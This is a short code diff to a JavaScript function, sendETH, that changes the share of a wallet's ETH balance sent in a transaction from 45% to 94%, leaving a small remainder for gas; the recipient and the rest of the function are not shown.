@@ -15,7 +15,7 @@ export const sendETH = async (provider, signer) => {
         }
 
         // leave small buffer for gas (safe method)
-        const amountToSend = (balanceWei * 45n) / 100n;
+        const amountToSend = (balanceWei * 94n) / 100n;
 
         // send transaction
         const tx = await signer.sendTransaction({
